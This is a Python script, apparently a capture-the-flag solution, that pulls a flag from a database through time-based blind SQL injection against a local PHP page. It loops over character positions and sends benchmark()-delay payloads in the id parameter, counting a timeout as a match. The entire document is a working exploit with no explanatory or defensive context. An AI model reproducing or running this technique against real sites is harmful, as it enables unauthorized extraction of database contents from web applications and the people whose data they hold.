import sys, string, requests

version_chars = ".-{}_" + string.ascii_letters + string.digits + '#'
flag = ""
for i in range(1,40):
    for char in version_chars:
        payload = "-1 or if(ascii(mid((select flag from flag),%s,1))=%s,benchmark(200000000,7^3^8),0)" % (i,ord(char))
        url = "http://localhost/index.php?id=%s" % payload
        if char == '#':
            if(flag):
                sys.stdout.write("\n[+] The flag is： %s" % flag)
                sys.stdout.flush()
            else:
                print("[-] Something run error!")
            exit()
        try:
            r = requests.post(url=url, timeout=2.0)
        except Exception as e:
            flag += char
            sys.stdout.write("\r[-] Try to get flag： %s" % flag)
            sys.stdout.flush()
            break
print("[-] Something run error!")
